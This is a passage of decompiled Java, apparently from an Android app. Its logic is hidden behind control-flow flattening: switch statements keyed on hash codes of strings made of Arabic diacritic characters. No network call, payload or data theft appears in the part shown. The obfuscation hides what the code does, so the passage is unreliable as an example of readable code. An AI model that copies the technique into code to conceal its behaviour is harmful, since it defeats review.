                    str = "ۧۜۘۘۚۛۥۘۖۛۥۘۙۦۙۘۛۚۨۨۘۡۜ۬ۥۤۙۛۨۚۡ۠ۖۥۢۙۧۗۡۘۥۖۨۘۗۛۜۧۖۘۨۗۛ۟ۚۨۘۘ۟ۗ";
                    str2 = strArr2[0];
                case 849098901:
                    str = "ۙۨۧۜۨ۬ۛۢۜ۬ۜۨۚۛ۬ۜۡۧ۬ۥۡۘۚۜۖ۟ۖۡۘۨ۠ۦۘ";
                    i3 = 0;
                case 854795577:
                    a = true;
                    str = "ۦۙ۫ۖۛۨۢ۟ۡۘۚ۠ۢۜ۫ۨۘۢۨ۬ۢ۫ۢۚ۠ۘۦۨۖۘۗۧ۬ۛۚ۫ۛۖۖۧۨۢۛۦۖ۠ۦۦ۠ۡۘۡۚۤۢ۠ۜ";
                case 900186151:
                    str = "ۚۘۗۦۘۙ۫ۢۧۡۗۘۘۡ۠ۜۦ۬ۚۗۚ۬ۨۘۥۧ۟۠ۡۨۜ۬ۨۘۜۚۥ۬ۛ۠ۘۛۢۗ۟ۤۜۙۖۘۡۙۚۢۢ";
                    strArr3 = new String[0];
                case 1142042311:
                    strArr2 = new String[2];
                    str = "ۗ۫ۖۛۥۢۥۘۚۢۤۚۨۚۖۜۘۙۗ۬ۗۤۢۤ۟ۢۛۡۜۥۖۡ۟ۢۜۚۡۘۥ۟ۚۧۛ۠۟ۨۙ";
                case 1247776232:
                    str = "ۤۘۗۛ۟ۜۘ۟ۨۚ۬ۛ۫ۡ۠ۚۢۗۡۘۜۧۡۨۢۛۖۚ۟۫ۡ۫۠ۜۘۘۧۖۨۘ۟۠ۦۘۚۗ۬ۦۗۦۘۜۗۥ";
                    strArr = strArr3;
                case 1271888411:
                    str = "ۛ۫ۡۘۜۨۤۧۤۙ۬ۦۜ۠ۛۥۘۛۚۡۛۛۖۘۖ۠۬ۙۨۡۘۥۜۤۤ۠ۜۧۙۨ۠۬ۥۘۤۙۖ";
                case 1632769965:
                    String str13 = "۠ۧۚۦۖ۬۬ۧۢ۬ۥۘ۟۫۠ۘۛۜۚۜۤۗۙۥۘۙۦ۠ۚۥۢۙۢ۫ۙۜۡ";
                    while (true) {
                        switch (str13.hashCode() ^ (-440020216)) {
                            case -2069235766:
                                str = "ۡۘۘۘۦۧۤۥ۬ۢۥۙۡۘۤۘۨۡۖۡۘۗ۟ۖۘۥۡۘۘۗ۬ۤۚ۟ۢۤۡۖۘۗۙۦۘۛۧ۬ۦۜۛۨۦۛ۫ۦۡۢۛۚۜۧۘ";
                                continue;
                            case -1672057014:
                                str = "ۜۦۨۘۨ۬۠ۜ۠ۛۧ۫ۚ۬۬ۖۘۘ۬ۗ۫ۡۧۘۖۜۖ۟ۚۘۧ۟ۙۚۤۘۘۡ۟ۙۖۤۨۘۨۛۨۜۤۜۘۦۨۖۘ";
                                continue;
                            case -1104138087:
                                String str14 = "۠ۖۡۘۗ۬ۦۘ۠ۜۤۙ۬۟ۥۢۨ۠ۤۜۖۨۨۘۧۡۦۘ۫۫۠ۤۥۗ";
                                while (true) {
                                    switch (str14.hashCode() ^ (-1430427543)) {
                                        case -2013500509:
                                            str13 = "ۥۨۡۘۥۢۡۘ۠ۨ۬ۗ۟ۡۘۚۗۡ۠ۥۜۚۚۗۘۨۖۗۜ۠ۦۢۜۥۙۦۢۖۜۜۘۢۦ";
                                            break;
                                        case -74499085:
                                            str13 = "ۘۡۢۡۨۤ۫ۥۡۘۛۦۥ۬۬ۦۘۨۥۖۚۡۧ۠۠۬ۘۙ۫ۖۧۧۥۤۖۘۥ۠۠ۛۦۦۘ۬ۧۘۘ";
                                            break;
                                        case 481246917:
                                            str14 = "ۧ۬۟۠ۘۜۘۗۜۜۘۜ۫ۛۢ۫ۦۘ۠ۨۨۚۜ۟ۧۘۥۙ۫ۗۜۗ۫";
                                        case 1615946944:
                                            str14 = !zEquals ? "ۚ۠ۦۤۡۗۛۡۥۡۧۦۡۖۚ۠ۜۧۘۦۦۚۨۥۥۘ۫ۢۗۙۤۜۥ۠ۘۘ۫۫ۢۢۤ۫۫۬ۘۘۤۢۦۗۨۢۥۥۘۙۡۜ" : "ۦۡۚۙۗۖۘ۬۫ۨۡۛۨۢۥۢۡۖۨۘۛۥۛۖ۬ۥۗ۠ۢ۟ۥۡۚۨۧۜۘۖۖۨۛۢ";
                                    }
                                }
                                break;
                            case -599223750:
                                str13 = "۫ۨ۟ۡ۠ۨۘۗۛۖۤۖۧۙۤۦۘۙ۫ۗۚۚۤۧۚۗ۠ۚۡۘۚۚ۠۠۟ۢۜۚۦۥۖۡۚۡۧۘۜۡۖۘۨۘۡ";
                                break;
                        }
                    }
                    break;
                case 1721810601:
                    break;
                case 1853204218:
                    str = "ۧۥۧۥ۬ۘۘۧۚۧۚۖۘۘ۬۬ۤ۬ۤۦۧۘۗۗۙۦ۬۠ۛ۟۟۟ۙۘۘۦۙ۟ۖۚ۫۠ۢۧۛۢۦۗۢۨۘۙۤۤ۠ۘ۬";
                    i4 = i3;
                case 1856962018:
                    str = "ۤۙۧۚۘۖۘۗۥۖۗۘۦ۠ۤۡ۠ۖۜۘۢۧۗۘۙۗۨۜ۟ۛۚ۬ۤ۫ۨۘۖۦ۟۬ۗۢۡۙ۫";
            }
            return;
        }
    }
}
